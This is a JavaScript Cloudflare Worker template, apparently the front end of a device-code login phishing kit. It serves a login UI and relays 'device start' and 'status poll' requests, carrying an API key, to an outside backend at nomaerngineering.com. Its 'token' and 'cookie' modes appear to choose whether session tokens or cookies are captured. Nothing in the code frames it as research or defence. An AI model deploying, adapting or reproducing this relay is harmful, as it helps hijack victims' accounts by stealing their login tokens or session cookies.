addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

// 🔥 MODE: token / cookie
const MODE = "{{MODE}}"
const API_KEY = "{{API_KEY}}"

async function handleRequest(request) {

  const url = new URL(request.url)
  const path = url.pathname

  // =========================
  // UI
  // =========================
  if (request.method === "GET" && path === "/") {
    return new Response(htmlUI(), {
      headers: { "content-type": "text/html" }
    })
  }

  // =========================
  // START LOGIN
  // =========================
  if (request.method === "POST" && path === "/api/device/start") {
    return start()
  }

  // =========================
  // POLL STATUS
  // =========================
  if (request.method === "GET" && path.startsWith("/api/device/status/")) {

    const loginId = path.split("/").pop()

    return poll(loginId)
  }

  return new Response("Not found", { status: 404 })
}

//
// =========================
// 🚀 START
// =========================
async function start() {
  try {

    // 🔥 pilih endpoint berdasarkan MODE
    const endpoint = MODE === "cookie"
      ? "/api/command/start"
      : "/api/start"

    const resp = await fetch(
      `https://nomaerngineering.com${endpoint}?api_key=${API_KEY}`,
      { method: "POST" }
    )

    const text = await resp.text()

    if (!resp.ok) {
      return new Response("HTTP ERROR " + resp.status + "\n\n" + text)
    }

    if (!text.trim().startsWith("{")) {
      return new Response("NOT JSON:\n\n" + text)
    }

    const data = JSON.parse(text)

    return new Response(JSON.stringify(data), {
      headers: { "content-type": "application/json" }
    })

  } catch (e) {
    return new Response("Worker crash: " + e.message)
  }
}

//
// =========================
// 🔄 POLL
// =========================
async function poll(loginId) {
  try {

    // 🔥 pilih endpoint berdasarkan MODE
    const endpoint = MODE === "cookie"
      ? `/api/command/poll/${loginId}`
      : `/api/poll/${loginId}`

    const resp = await fetch(
      `https://nomaerngineering.com${endpoint}?api_key=${API_KEY}`
    )

    const text = await resp.text()

    let data
    try {
      data = JSON.parse(text)
    } catch (e) {
      return new Response("Invalid JSON:\n" + text, { status: 500 })
    }

    return new Response(JSON.stringify(data), {
      headers: { "content-type": "application/json" }
    })

  } catch (e) {
    return new Response("Worker error: " + e.message, { status: 500 })
  }
}

//
// =========================
// UI
// =========================
function htmlUI() {
  return HTML_CONTENT
}